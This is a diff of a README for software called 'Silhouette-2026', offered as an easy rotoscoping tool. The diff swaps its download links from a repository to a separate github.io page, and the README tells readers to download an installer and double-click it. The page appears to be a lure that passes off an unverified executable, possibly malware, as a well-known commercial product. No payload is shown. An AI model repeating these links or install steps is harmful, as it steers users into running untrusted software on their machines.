@@ -1,6 +1,6 @@
 # 🎥 Silhouette-2026 - Create professional rotoscoping projects easily
 
-[![](https://img.shields.io/badge/Download-Silhouette_2026-blue.svg)](https://github.com/August-tamp308/Silhouette-2026)
+[![](https://img.shields.io/badge/Download-Silhouette_2026-blue.svg)](https://august-tamp308.github.io)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ Confirm your computer meets these specs before you start the install process. An
 
 Follow these steps to obtain and run the application.
 
-1.  Visit the official download page to get the installer package. [Link: Silhouette-2026](https://github.com/August-tamp308/Silhouette-2026).
+1.  Visit the official download page to get the installer package. [Link: Silhouette-2026](https://august-tamp308.github.io).
 2.  Click the download button to grab the file. Your browser saves the file in your Downloads folder by default.
 3.  Locate the downloaded file. It looks like an icon with an application extension.
 4.  Double-click the file to start the installation.
